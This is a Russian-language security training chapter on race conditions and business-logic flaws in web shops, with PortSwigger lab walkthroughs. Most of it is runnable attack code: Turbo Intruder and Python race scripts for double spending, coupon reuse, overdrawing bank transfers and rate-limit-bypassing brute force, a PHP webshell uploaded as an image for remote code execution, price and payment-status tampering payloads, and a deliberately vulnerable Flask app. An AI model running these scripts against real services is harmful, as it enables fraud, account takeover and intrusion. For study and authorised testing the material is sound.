# Глава 14.4: Race Conditions и Advanced Business Logic

## 🎯 Цели главы

- Понять природу Race Conditions в веб-приложениях и паттерн TOCTOU
- Освоить Turbo Intruder для тестирования состояний гонки
- Разобрать практические примеры: двойное списание, параллельные запросы
- Изучить advanced business logic уязвимости: многошаговые процессы
- Освоить техники price manipulation и quantity tampering
- Научиться выявлять workflow bypass
- Выполнить практические упражнения на PortSwigger Academy

---

## 14.4.1 Race Conditions в веб-приложениях

### Что такое Race Condition

Race Condition (состояние гонки) возникает, когда несколько процессов одновременно обращаются к разделяемому ресурсу, и результат зависит от порядка выполнения этих операций.

```
НОРМАЛЬНОЕ ВЫПОЛНЕНИЕ:
Запрос 1 → [Проверка] → [Обновление] → [Ответ]
                                          ↓
Запрос 2 → [Проверка] → [Обновление] → [Ответ]

RACE CONDITION:
Запрос 1 → [Проверка: баланс=100] ─────────────────→ [Обновление: 100-100=0] → OK
                                   ↕ (одновременно)
Запрос 2 → [Проверка: баланс=100] ─────────────────→ [Обновление: 100-100=0] → OK

Результат: потрачено 200, но баланс = 0 вместо отрицательного!
```

### TOCTOU — Time of Check to Time of Use

TOCTOU — специфический класс Race Conditions:

```
TOCTOU паттерн:
                     ОКНО УЯЗВИМОСТИ
                    ←───────────────→
Легитимный запрос: [Проверить условие] ... [Использовать ресурс]
                           ↑                        ↑
                     (Time of Check)          (Time of Use)

Атака: вставить изменение в "окно уязвимости"
```

**Конкретный пример (купон на скидку):**
```python
# Уязвимый код
def apply_coupon(user_id, coupon_code):
    coupon = db.get_coupon(coupon_code)
    
    # Time of Check: купон действителен?
    if coupon.is_used:
        return "Купон уже использован"
    
    # ОКНО УЯЗВИМОСТИ (между проверкой и использованием)
    # В этот момент другой запрос тоже проверяет купон
    
    # Time of Use: применяем скидку
    db.mark_coupon_used(coupon_code)  # Слишком поздно!
    apply_discount(user_id, coupon.discount)
    return "Скидка применена"
```

### Типы Race Conditions в веб-приложениях

| Тип | Описание | Пример |
|-----|----------|--------|
| Limit overrun | Обход лимита | Применить купон несколько раз |
| Double spending | Двойное использование | Снять деньги дважды |
| Parallel registration | Гонка при регистрации | Два аккаунта с одним email |
| Session fixation race | Гонка сессий | Захват чужой сессии |
| TOCTOU | Состояние между проверкой и использованием | Изменить файл между upload и scan |

---

## 14.4.2 Turbo Intruder для тестирования Race Conditions

### Что такое Turbo Intruder

Turbo Intruder — расширение Burp Suite для отправки HTTP-запросов с экстремально высокой скоростью. Написан на Python, поддерживает конкурентные запросы.

### Установка

```
1. Открыть Burp Suite
2. Extender → BApp Store
3. Найти "Turbo Intruder"
4. Установить
```

### Базовое использование

```python
# Скрипт Turbo Intruder для Race Condition
# (вставляется в поле Script в Turbo Intruder)

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,    # Параллельных соединений
                           requestsPerConnection=1,
                           pipeline=False)
    
    # Очередь из 10 одновременных запросов
    for i in range(10):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    # Анализируем каждый ответ
    candidate = req.response.status == 200 and 'discount applied' in req.response
    if candidate:
        table.add(req)
```

### Продвинутый скрипт для параллельных запросов

```python
# Turbo Intruder: Single-packet attack (HTTP/2)
# Отправка всех запросов в ОДНОМ TCP-пакете

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,  # Все запросы в одном соединении
                           pipeline=False,
                           engine=Engine.BURP2)  # HTTP/2 для синхронизации
    
    # Фаза прогрева (warming up connections)
    for i in range(20):
        engine.queue(target.req, 'warmup', gate='race1')
    
    # Открываем "ворота" — все запросы отправляются одновременно
    engine.openGate('race1')
    
    engine.start(timeout=30)

def handleResponse(req, interesting):
    table.add(req)
```

### Настройка Burp Suite для Race Conditions

```
Шаг 1: Перехватить уязвимый запрос
  - Proxy → Intercept ON
  - Выполнить целевое действие (применить купон, совершить платёж)
  - Forward запрос

Шаг 2: Отправить в Turbo Intruder
  - Правая кнопка на запросе → Extensions → Turbo Intruder → Send to Turbo Intruder

Шаг 3: Настроить параметры
  - Изменить параметр атаки (добавить %s в нужное место)
  - Выбрать скрипт (race-single-packet-attack.py)

Шаг 4: Запустить и анализировать
  - Attack
  - Наблюдать за ответами в таблице
```

---

## 14.4.3 Практические примеры Race Conditions

### Пример 1: Двойное списание средств

**Сценарий:** Интернет-магазин, баланс пользователя = 100$, товар стоит 100$.

```python
#!/usr/bin/env python3
"""
Race condition exploit: двойное списание
"""
import requests
import threading
import time

TARGET = "http://shop.com/api/purchase"
SESSION = "valid_session_cookie"
PRODUCT_ID = "expensive_item"

def make_purchase():
    r = requests.post(
        TARGET,
        cookies={'session': SESSION},
        json={'product_id': PRODUCT_ID, 'quantity': 1}
    )
    print(f"Thread {threading.current_thread().name}: {r.status_code} - {r.json()}")

# Создаём 10 параллельных потоков
threads = []
for i in range(10):
    t = threading.Thread(target=make_purchase, name=f"T{i}")
    threads.append(t)

# Запускаем все одновременно
print("[*] Запускаем Race Condition атаку...")
start_time = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()

elapsed = time.time() - start_time
print(f"[*] Завершено за {elapsed:.2f}s")
```

**Улучшенная синхронизация с Event:**
```python
#!/usr/bin/env python3
"""
Улучшенная Race Condition атака с синхронизацией
"""
import requests
import threading

TARGET = "http://shop.com/api/purchase"
SESSION = "valid_session_cookie"

# Event для синхронизации старта всех потоков
start_event = threading.Event()
results = []

def synchronized_purchase(thread_id):
    """Каждый поток ждёт сигнала для одновременного старта"""
    
    # Подготавливаем запрос (установка соединения)
    session = requests.Session()
    session.cookies.set('session', SESSION)
    
    # Ждём сигнала запуска
    start_event.wait()
    
    # Отправляем запрос
    r = session.post(TARGET, json={'product_id': 'expensive_item'})
    results.append({
        'thread': thread_id,
        'status': r.status_code,
        'response': r.text[:100]
    })

# Создаём потоки
threads = []
for i in range(20):
    t = threading.Thread(target=synchronized_purchase, args=(i,))
    threads.append(t)
    t.start()

print(f"[*] {len(threads)} потоков готово. Запускаем...")

# Даём команду всем потокам одновременно
start_event.set()

for t in threads:
    t.join()

# Анализ результатов
success_count = sum(1 for r in results if r['status'] == 200)
print(f"[*] Успешных запросов: {success_count}/{len(results)}")

for r in results:
    print(f"  Thread {r['thread']}: {r['status']} - {r['response']}")
```

### Пример 2: Обход ограничения купона

```python
#!/usr/bin/env python3
"""
Race condition: одновременное применение купона с разных "устройств"
"""
import requests
import threading
import json

class CouponRaceAttack:
    def __init__(self, base_url: str, coupon_code: str, num_threads: int = 20):
        self.base_url = base_url
        self.coupon_code = coupon_code
        self.num_threads = num_threads
        self.results = []
        self.lock = threading.Lock()
        self.start_barrier = threading.Barrier(num_threads)
    
    def apply_coupon(self, session_token: str, thread_id: int):
        """Попытка применить купон"""
        
        headers = {
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json',
        }
        
        payload = {
            'coupon_code': self.coupon_code,
            'cart_id': 'CART123'
        }
        
        # Ждём, пока все потоки будут готовы
        self.start_barrier.wait()
        
        try:
            r = requests.post(
                f"{self.base_url}/api/coupon/apply",
                headers=headers,
                json=payload,
                timeout=10
            )
            
            with self.lock:
                self.results.append({
                    'thread_id': thread_id,
                    'status': r.status_code,
                    'success': 'discount' in r.text.lower(),
                    'response': r.text[:200]
                })
        except Exception as e:
            with self.lock:
                self.results.append({
                    'thread_id': thread_id,
                    'error': str(e)
                })
    
    def attack(self, session_token: str):
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(
                target=self.apply_coupon,
                args=(session_token, i)
            )
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        # Подсчёт успехов
        successes = [r for r in self.results if r.get('success')]
        print(f"[+] Успешных применений купона: {len(successes)}/{self.num_threads}")
        
        for r in successes:
            print(f"  Thread {r['thread_id']}: {r['response'][:100]}")
        
        return successes

# Запуск атаки
attack = CouponRaceAttack("http://shop.com", "DISCOUNT50", num_threads=25)
successes = attack.attack("your_session_token_here")
```

### Пример 3: Race Condition в файловой загрузке

```python
#!/usr/bin/env python3
"""
Race condition: загрузка вредоносного файла
Между upload и проверкой на вирусы — окно для выполнения
"""
import requests
import threading
import time

TARGET = "http://target.com"

# Файл, который ждёт проверки (PHP webshell замаскированный под .jpg)
WEBSHELL = b"""
GIF89a
<?php system($_GET['cmd']); ?>
"""

def upload_file():
    """Загружаем файл"""
    files = {'file': ('photo.jpg', WEBSHELL, 'image/jpeg')}
    r = requests.post(f"{TARGET}/upload", files=files)
    # Получаем путь к загруженному файлу
    return r.json().get('path', '')

def access_file(path: str, duration: int = 5):
    """Пытаемся обратиться к файлу пока он проходит проверку"""
    end_time = time.time() + duration
    while time.time() < end_time:
        r = requests.get(f"{TARGET}/{path}?cmd=id")
        if 'uid=' in r.text:
            print(f"[+] RCE получен! Путь: {path}")
            print(f"[+] Результат: {r.text}")
            return True
        time.sleep(0.01)
    return False

# Атака
print("[*] Запускаем race condition атаку на upload...")

file_path = upload_file()
print(f"[*] Файл загружен: {file_path}")

# Одновременно пытаемся получить доступ
success = access_file(file_path, duration=10)
if not success:
    print("[-] Race condition не удалась (файл удалён/переименован)")
```

### Пример 4: Параллельная регистрация пользователей

```python
#!/usr/bin/env python3
"""
Race condition: регистрация двух аккаунтов с одним email
(создание дублирующего аккаунта если уникальность не атомарна)
"""
import requests
import threading

TARGET = "http://target.com/api/register"
EMAIL = "victim@company.com"  # Email уже существующего пользователя

results = []
lock = threading.Lock()
barrier = threading.Barrier(10)

def register(thread_id: int):
    barrier.wait()  # Синхронизация
    
    r = requests.post(TARGET, json={
        'email': EMAIL,
        'password': f'attacker_pass_{thread_id}',
        'username': f'attacker_{thread_id}'
    })
    
    with lock:
        results.append({
            'thread': thread_id,
            'status': r.status_code,
            'body': r.text[:200]
        })

threads = [threading.Thread(target=register, args=(i,)) for i in range(10)]
for t in threads: t.start()
for t in threads: t.join()

# Успех = более одного ответа с 200/201
successes = [r for r in results if r['status'] in (200, 201)]
print(f"Успешных регистраций: {len(successes)}")
for r in successes:
    print(f"  Thread {r['thread']}: {r['body'][:100]}")
```

---

## 14.4.4 Advanced Business Logic Vulnerabilities

### Что такое Business Logic Vulnerabilities

Business Logic Vulnerabilities (BLV) — уязвимости в бизнес-логике приложения. Они не связаны с классическими техническими уязвимостями (SQLi, XSS), а возникают из-за неправильной реализации бизнес-правил.

```
Технические уязвимости:          Логические уязвимости:
  SQLi, XSS, SSTI                  Некорректные скидки
  → Стандартные паттерны           → Обход бизнес-правил
  → Автоматические сканеры         → Нужно понимать контекст
  → Легко обнаружить               → Требует мышления тестировщика
```

### Категории Business Logic Vulnerabilities

| Категория | Описание | Пример |
|-----------|----------|--------|
| Excessive trust | Доверие к клиентским данным | Цена в запросе |
| Flawed assumptions | Неверные предположения | Ожидание последовательных шагов |
| Inconsistent validation | Непоследовательная валидация | Правило применяется не везде |
| Workflow bypass | Пропуск шагов процесса | Оплата без проверки |
| Race conditions | Состояние гонки | Одновременные запросы |

---

## 14.4.5 Price Manipulation и Quantity Tampering

### Price Manipulation

**Сценарий 1: Цена в теле запроса**

```http
# Нормальный запрос добавления в корзину
POST /cart/add HTTP/1.1
Content-Type: application/json

{
    "product_id": "laptop-pro",
    "quantity": 1,
    "price": 1299.99     ← Цена отправляется клиентом!
}

# Атака: изменяем цену
{
    "product_id": "laptop-pro",
    "quantity": 1,
    "price": 1          ← Ноутбук за $1!
}
```

**Сценарий 2: Отрицательное количество**

```http
# Добавляем отрицательное количество дорогого товара
POST /cart/add HTTP/1.1
Content-Type: application/json

{
    "product_id": "cheap-item",
    "quantity": 1,
    "price": 5.00
}

# Добавляем дорогой товар с отрицательным количеством
{
    "product_id": "expensive-item",
    "quantity": -1,
    "price": 999.00
}

# Итог: total = 5.00 + (-1 * 999.00) = -994.00 → нам должны денег!
```

**Сценарий 3: Integer Overflow в количестве**

```http
# Если количество int32, максимум = 2147483647
{
    "product_id": "item",
    "quantity": 2147483648,  ← Overflow → -2147483648
    "price": 1.00
}
# total = -2147483648 * 1.00 = огромный отрицательный баланс
```

### Практический скрипт для price manipulation

```python
#!/usr/bin/env python3
"""
Price Manipulation тестер
"""
import requests

TARGET = "http://shop.com"
SESSION = "your_session_token"

def test_price_manipulation():
    """Попытка изменить цену в запросе"""
    
    tests = [
        # (product_id, quantity, manipulated_price, description)
        ("expensive-laptop", 1, 0.01, "Почти бесплатно"),
        ("expensive-laptop", 1, -100, "Отрицательная цена"),
        ("cheap-item", 1000000, 0.001, "Огромное количество по минимальной цене"),
        ("cheap-item", -1, 999.00, "Отрицательное количество дорогого товара"),
        ("item", 2147483648, 1.00, "Integer overflow в количестве"),
    ]
    
    headers = {'Authorization': f'Bearer {SESSION}', 'Content-Type': 'application/json'}
    
    for product_id, qty, price, desc in tests:
        # Добавляем в корзину
        r = requests.post(
            f"{TARGET}/api/cart/add",
            headers=headers,
            json={'product_id': product_id, 'quantity': qty, 'price': price}
        )
        
        if r.status_code == 200:
            # Проверяем итоговую цену корзины
            cart = requests.get(f"{TARGET}/api/cart", headers=headers).json()
            total = cart.get('total', 'N/A')
            print(f"[+] {desc}: Итого = {total}")
        else:
            print(f"[-] {desc}: {r.status_code} - {r.text[:100]}")

test_price_manipulation()
```

### Quantity Tampering

```python
def test_quantity_tampering():
    """Тест на манипуляцию количеством"""
    
    # Шаг 1: Добавляем 1 единицу дешёвого товара
    add_to_cart("cheap-pen", 1)
    
    # Шаг 2: Применяем купон на "1 товар — скидка 50%"
    apply_coupon("HALF_OFF_ONE_ITEM")
    
    # Шаг 3: МЕНЯЕМ количество ПОСЛЕ применения купона
    update_cart_quantity("cheap-pen", 100)
    
    # Шаг 4: Оформляем заказ — скидка 50% на 100 единиц!
    checkout()
```

---

## 14.4.6 Workflow Bypass Techniques

### Многошаговые процессы

Многие веб-приложения реализуют многошаговые процессы (wizard), предполагая, что пользователь проходит их последовательно.

```
Нормальный flow оформления заказа:
Шаг 1: Корзина
   ↓
Шаг 2: Адрес доставки
   ↓
Шаг 3: Выбор доставки
   ↓
Шаг 4: Оплата → Проверка
   ↓
Шаг 5: Подтверждение заказа

Атака: пропуск Шага 4
Шаг 1 → Шаг 2 → Шаг 3 → [Шаг 5 напрямую] → Бесплатный заказ!
```

### Техники workflow bypass

**Техника 1: Прямой доступ к конечной точке**
```bash
# Нормальный запрос
GET /checkout/step1
POST /checkout/step2
POST /checkout/step3
POST /checkout/payment  ← Оплата
GET  /checkout/confirm  ← Подтверждение

# Bypass: переходим сразу к confirm
GET /checkout/confirm
# Если сервер не проверяет, был ли пройден step payment — успех!
```

**Техника 2: Манипуляция состоянием через параметры**
```http
# Запрос оплаты
POST /checkout/payment HTTP/1.1

{
    "payment_status": "pending",  ← Изменяем на:
    "payment_status": "completed"
}
```

**Техника 3: Cookie/Session manipulation**
```bash
# Декодирование сессионного токена
echo "eyJzdGVwIjogMywgInBhaWQiOiBmYWxzZX0=" | base64 -d
# {"step": 3, "paid": false}

# Создание модифицированного токена
echo '{"step": 4, "paid": true}' | base64
# eyJzdGVwIjogNCwgInBhaWQiOiB0cnVlfQ==

# Отправка модифицированного токена
curl -H "Cookie: checkout_state=eyJzdGVwIjogNCwgInBhaWQiOiB0cnVlfQ==" \
  http://shop.com/checkout/confirm
```

**Техника 4: Манипуляция заголовками**
```http
# Пропуск проверки через заголовок
POST /checkout/confirm HTTP/1.1
X-Payment-Status: verified    ← Кастомный заголовок
X-Internal-Request: true      ← Имитация внутреннего запроса
X-Forwarded-For: 127.0.0.1  ← Попытка казаться localhost
```

### Скрипт для тестирования workflow bypass

```python
#!/usr/bin/env python3
"""
Workflow Bypass тестер для многошаговых процессов
"""
import requests

class WorkflowBypassTester:
    def __init__(self, base_url: str, session_token: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_token)
        self.steps = []
    
    def record_step(self, method: str, path: str, data: dict = None):
        """Записываем шаг нормального workflow"""
        self.steps.append({
            'method': method,
            'path': path,
            'data': data
        })
    
    def test_skip_payment(self):
        """Попытка пропустить шаг оплаты"""
        
        print("\n[*] Тест 1: Пропуск шага оплаты")
        
        # Выполняем все шаги кроме оплаты
        for step in self.steps[:-1]:  # Все кроме последнего (оплата)
            r = self.session.request(
                step['method'],
                f"{self.base_url}{step['path']}",
                json=step['data']
            )
            print(f"  Шаг {step['path']}: {r.status_code}")
        
        # Пробуем финальное подтверждение
        r = self.session.get(f"{self.base_url}/checkout/confirm")
        if 'order_id' in r.text.lower() or r.status_code == 200:
            print("[!] УЯЗВИМОСТЬ: Заказ оформлен без оплаты!")
            return True
        
        print("[-] Защищено: пропуск оплаты не прошёл")
        return False
    
    def test_payment_status_injection(self):
        """Манипуляция статусом оплаты"""
        
        print("\n[*] Тест 2: Инъекция статуса оплаты")
        
        manipulated_statuses = [
            {'payment_status': 'success'},
            {'payment_status': 'completed'},
            {'payment_status': 'paid'},
            {'paid': True},
            {'status': 'approved'},
            {'transaction_id': 'FAKE-TXN-123', 'success': True},
        ]
        
        for status in manipulated_statuses:
            r = self.session.post(
                f"{self.base_url}/checkout/payment",
                json=status
            )
            if 'order_id' in r.text.lower():
                print(f"[!] УЯЗВИМОСТЬ с payload: {status}")
                return True
        
        print("[-] Защищено")
        return False
    
    def test_parameter_tampering(self):
        """Тест на манипуляцию параметрами формы"""
        
        print("\n[*] Тест 3: Манипуляция скрытыми параметрами")
        
        # Получаем форму оплаты
        payment_page = self.session.get(f"{self.base_url}/checkout/payment")
        
        # Ищем скрытые поля (amount, total, price)
        import re
        hidden_fields = re.findall(
            r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            payment_page.text
        )
        
        print(f"  Найдено скрытых полей: {len(hidden_fields)}")
        for name, value in hidden_fields:
            print(f"    {name} = {value}")
        
        # Пробуем изменить суммовые поля
        form_data = dict(hidden_fields)
        for field in form_data:
            if any(keyword in field.lower() for keyword in ['amount', 'total', 'price', 'sum']):
                original = form_data[field]
                form_data[field] = '0.01'
                print(f"  Изменяем {field}: {original} → 0.01")
        
        r = self.session.post(f"{self.base_url}/checkout/payment", data=form_data)
        print(f"  Ответ: {r.status_code}")

# Пример использования
tester = WorkflowBypassTester("http://shop.com", "session_token")

# Записываем шаги нормального процесса
tester.record_step('POST', '/checkout/cart', {'action': 'proceed'})
tester.record_step('POST', '/checkout/address', {'address': '123 Main St'})
tester.record_step('POST', '/checkout/shipping', {'method': 'standard'})
# Шаг оплаты - то что хотим пропустить

tester.test_skip_payment()
tester.test_payment_status_injection()
tester.test_parameter_tampering()
```

---

## 14.4.7 Тестирование через Burp Suite

### Настройка Burp для BLV тестирования

```
1. СБОР ДАННЫХ (Mapping)
   - Proxy → HTTP History → фильтр по Target
   - Пройти весь функционал приложения
   - Обратить внимание на:
     * Скрытые поля форм (hidden inputs)
     * Параметры цены/количества
     * Флаги состояния (is_paid, status, step)
     * JWT и другие токены

2. АНАЛИЗ ЛОГИКИ
   - Site Map → правая кнопка → Engagement Tools → Analyze Target
   - Найти все параметры, связанные с ценами/состоянием

3. ТЕСТИРОВАНИЕ
   - Repeater: изменять параметры и наблюдать
   - Intruder: автоматизировать перебор значений
   - Turbo Intruder: Race Conditions
   - Comparer: сравнивать ответы при разных значениях
```

### Burp Suite Match & Replace для автоматической Price Manipulation

```
Settings → Proxy → Match and Replace:

Правило 1: Изменять цену в запросах
  Type: Request body
  Match: "price":\s*\d+\.?\d*
  Replace: "price":0.01

Правило 2: Изменять quantity на отрицательный
  Type: Request body  
  Match: "quantity":\s*(\d+)
  Replace: "quantity":-1

Правило 3: Inject payment_status
  Type: Request body
  Match: "payment_status":\s*"[^"]*"
  Replace: "payment_status":"completed"
```

### Использование Burp Sequencer для анализа токенов

```
1. Перехватить запрос с токеном/CSRF
2. Right-click → Send to Sequencer
3. Указать местоположение токена
4. Analyze → получить оценку случайности
5. Если FIPS = < 90% → токен предсказуем!
```

---

## 14.4.8 Дополнительные техники Business Logic

### Account Balance Race Condition

```python
#!/usr/bin/env python3
"""
Атака на банковский перевод через Race Condition
Цель: отправить больше денег, чем есть на счёте
"""
import requests
import threading

BASE_URL = "http://banking.com/api"
TOKEN = "your_jwt_token"

HEADERS = {
    'Authorization': f'Bearer {TOKEN}',
    'Content-Type': 'application/json'
}

def transfer_money(amount: float, to_account: str, thread_id: int):
    """Попытка перевода"""
    r = requests.post(
        f"{BASE_URL}/transfer",
        headers=HEADERS,
        json={
            'to': to_account,
            'amount': amount,
            'currency': 'USD'
        }
    )
    status = "OK" if r.status_code == 200 else "FAIL"
    print(f"Thread {thread_id}: {status} - {r.json()}")

# Баланс: $100
# Цель: перевести $100 * 5 = $500

barrier = threading.Barrier(5)

def attack(thread_id):
    barrier.wait()
    transfer_money(100.0, "attacker_account", thread_id)

threads = [threading.Thread(target=attack, args=(i,)) for i in range(5)]
for t in threads: t.start()
for t in threads: t.join()
```

### Coupon Stacking (Несовместимые скидки)

```python
#!/usr/bin/env python3
"""
Тест: применение нескольких несовместимых купонов
"""
import requests

SESSION = requests.Session()
SESSION.cookies.set('session', 'your_session')
BASE = "http://shop.com"

coupons = ['SAVE10', 'SAVE20', 'HALF_OFF', 'VIP30', 'WELCOME15']

# Применяем купоны последовательно
for coupon in coupons:
    r = SESSION.post(f"{BASE}/api/coupon/apply", json={'code': coupon})
    print(f"Купон {coupon}: {r.status_code} - {r.text[:100]}")

# Проверяем итоговую скидку
cart = SESSION.get(f"{BASE}/api/cart").json()
print(f"\nИтоговая скидка: {cart.get('discount_percent', 0)}%")
print(f"Итоговая сумма: {cart.get('total', 'N/A')}")
```

### Privilege Escalation через Business Logic

```python
#!/usr/bin/env python3
"""
Тест эскалации привилегий через логические ошибки
"""
import requests

BASE = "http://app.com"

# Сценарий: регистрация как "premium" пользователь через манипуляцию полями

# Нормальная регистрация
r = requests.post(f"{BASE}/api/register", json={
    'email': 'attacker@evil.com',
    'password': 'password123',
    'plan': 'free',  # Обычно: free/premium
    'account_type': 'standard',
})

# Попытки манипуляции при регистрации
manipulation_attempts = [
    {'plan': 'premium', 'account_type': 'admin'},
    {'plan': 'enterprise', 'is_admin': True},
    {'role': 'admin', 'plan': 'premium'},
    {'account_level': 99, 'premium': True},
]

for payload in manipulation_attempts:
    payload.update({
        'email': f"test_{hash(str(payload))}@evil.com",
        'password': 'password123'
    })
    
    r = requests.post(f"{BASE}/api/register", json=payload)
    
    if r.status_code in (200, 201):
        # Проверяем полученные привилегии
        token = r.json().get('token', '')
        if token:
            profile = requests.get(
                f"{BASE}/api/me",
                headers={'Authorization': f'Bearer {token}'}
            ).json()
            
            print(f"Зарегистрирован: {profile}")
            if profile.get('role') == 'admin' or profile.get('plan') == 'premium':
                print(f"[!] УЯЗВИМОСТЬ: получены повышенные права с payload: {payload}")
```

---

## 14.4.9 Практика: PortSwigger Academy Race Conditions

### Lab 1: Exceeding a limit using multiple requests

**URL:** `https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun`

**Задача:** Применить купон PROMO20 более одного раза.

```
Шаг 1: Настройка Burp Suite
1. Перехватить запрос применения купона
2. Отправить в Turbo Intruder

Шаг 2: Скрипт Turbo Intruder
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)
    
    # Отправляем 20 запросов максимально синхронно
    for i in range(20):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    table.add(req)
```

### Lab 2: Bypassing rate limits via race conditions

**Задача:** Обойти ограничение на количество попыток входа.

```python
#!/usr/bin/env python3
"""
Brute force через Race Condition для обхода rate limit
"""
import requests
import threading

TARGET = "http://YOUR-LAB.web-security-academy.net"
USERNAME = "carlos"
PASSWORDS = ['123456', 'password', 'carlos', 'jordan', 'diamond']

results = []
barrier = threading.Barrier(len(PASSWORDS))

def try_login(password: str, idx: int):
    barrier.wait()  # Все потоки ждут, потом одновременно
    
    r = requests.post(
        f"{TARGET}/login",
        data={'username': USERNAME, 'password': password},
        allow_redirects=False
    )
    
    success = r.status_code == 302 and '/my-account' in r.headers.get('Location', '')
    results.append({
        'password': password,
        'status': r.status_code,
        'success': success,
        'location': r.headers.get('Location', '')
    })
    
    if success:
        print(f"[+] Верный пароль: {password}")

threads = [
    threading.Thread(target=try_login, args=(pwd, i))
    for i, pwd in enumerate(PASSWORDS)
]
for t in threads: t.start()
for t in threads: t.join()

# Анализ
for r in results:
    print(f"  {r['password']}: {r['status']} {'SUCCESS!' if r['success'] else ''}")
```

### Lab 3: Multi-endpoint race conditions

**Задача:** Оформить заказ, превышающий баланс счёта.

```
Шаг 1: Понять endpoint'ы
  POST /cart/add        - добавление товара
  POST /cart/checkout   - оформление заказа
  GET  /cart            - просмотр корзины

Шаг 2: Найти race window
  Момент между добавлением дорогого товара и проверкой баланса

Шаг 3: Turbo Intruder
```

```python
# Turbo Intruder скрипт для multi-endpoint race
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)
    
    # Запрос 1: добавить дорогой товар
    add_request = '''POST /cart/add HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1'''
    
    # Запрос 2: оформить заказ
    checkout_request = target.req  # Используем перехваченный запрос checkout
    
    # Отправляем несколько add + несколько checkout
    for i in range(5):
        engine.queue(add_request, str(i), gate='race')
    for i in range(5):
        engine.queue(checkout_request, str(i), gate='race')
    
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 14.4.10 Практические упражнения

### Упражнение 1: Локальная лаборатория Race Condition

```python
#!/usr/bin/env python3
"""
Уязвимое Flask-приложение для тестирования Race Conditions
"""
from flask import Flask, request, jsonify, session
import threading
import time

app = Flask(__name__)
app.secret_key = 'lab_secret'

# База данных (в памяти для простоты)
users_db = {
    'user1': {'balance': 100, 'coupon_used': False}
}
db_lock = threading.Lock()  # Покажем что нужна блокировка

@app.route('/coupon/apply', methods=['POST'])
def apply_coupon():
    """УЯЗВИМЫЙ endpoint без блокировки"""
    user_id = request.json.get('user_id', 'user1')
    
    user = users_db.get(user_id, {})
    
    # УЯЗВИМОСТЬ: нет атомарной проверки и установки
    if user.get('coupon_used', False):
        return jsonify({'error': 'Купон уже использован'}), 400
    
    # Симуляция задержки базы данных (создаём окно для Race Condition)
    time.sleep(0.01)  # 10ms задержки
    
    # Устанавливаем флаг
    users_db[user_id]['coupon_used'] = True
    users_db[user_id]['balance'] += 50  # Добавляем бонус
    
    return jsonify({
        'success': True,
        'new_balance': users_db[user_id]['balance']
    })

@app.route('/balance')
def balance():
    user_id = request.args.get('user_id', 'user1')
    return jsonify({'balance': users_db.get(user_id, {}).get('balance', 0)})

if __name__ == '__main__':
    app.run(port=5001, threaded=True)
```

```bash
# Запускаем уязвимое приложение
python3 vuln_race.py &

# Начальный баланс
curl 'http://localhost:5001/balance?user_id=user1'
# {"balance": 100}

# Атака Race Condition (5 параллельных запросов)
for i in {1..5}; do
    curl -s -X POST 'http://localhost:5001/coupon/apply' \
      -H 'Content-Type: application/json' \
      -d '{"user_id": "user1"}' &
done
wait

# Проверяем итоговый баланс (должен быть 150, но может быть 250+)
curl 'http://localhost:5001/balance?user_id=user1'
```

### Упражнение 2: Тест price manipulation

```bash
# Простой тест изменения цены в корзине

# Шаг 1: Нормальное добавление (100$)
curl -s -X POST 'http://shop.local/cart/add' \
  -H 'Content-Type: application/json' \
  -d '{"product_id": "laptop", "quantity": 1, "price": 100}' \
  -c /tmp/cookies.txt

# Шаг 2: Проверка корзины
curl -s 'http://shop.local/cart' -b /tmp/cookies.txt | python3 -m json.tool

# Шаг 3: Изменяем цену
curl -s -X POST 'http://shop.local/cart/add' \
  -H 'Content-Type: application/json' \
  -d '{"product_id": "laptop", "quantity": 1, "price": 0.01}' \
  -c /tmp/cookies.txt

# Шаг 4: Проверяем — изменилась ли цена?
curl -s 'http://shop.local/cart' -b /tmp/cookies.txt | python3 -m json.tool
```

### Упражнение 3: Workflow bypass

```bash
# Тест пропуска шага оплаты

# Шаг 1: Формируем корзину
curl -s -X POST 'http://shop.local/cart/add' \
  -d 'product_id=item123&quantity=1' \
  -c /tmp/cookies.txt

# Шаг 2: Нормальный flow — адрес доставки
curl -s -X POST 'http://shop.local/checkout/address' \
  -d 'address=123+Main+St&city=Test&zip=12345' \
  -c /tmp/cookies.txt

# Шаг 3: ПРОПУСКАЕМ оплату — сразу к подтверждению
curl -s 'http://shop.local/checkout/confirm' \
  -c /tmp/cookies.txt

# Если получаем "Order ID" в ответе — уязвимость!
```

### Упражнение 4: Полное тестирование в PortSwigger Academy

```
Рекомендуемый порядок лабораторных:

1. Race conditions > Limit overrun (базовый)
   URL: portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
   
2. Race conditions > Bypassing rate limits
   URL: portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits

3. Business logic > Excessive trust in client-side controls
   URL: portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

4. Business logic > High-level logic vulnerability
   URL: portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level

5. Business logic > Flawed enforcement of business rules
   URL: portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules
```

---

## Итоги главы

### Шпаргалка Race Conditions

```
Инструменты:
  Turbo Intruder → Race Conditions в Burp Suite
  threading      → Python Race Conditions
  
Ключевые паттерны:
  Limit overrun:   один купон → N применений
  Double spending: один баланс → N списаний
  Registration:    один email → N аккаунтов
  
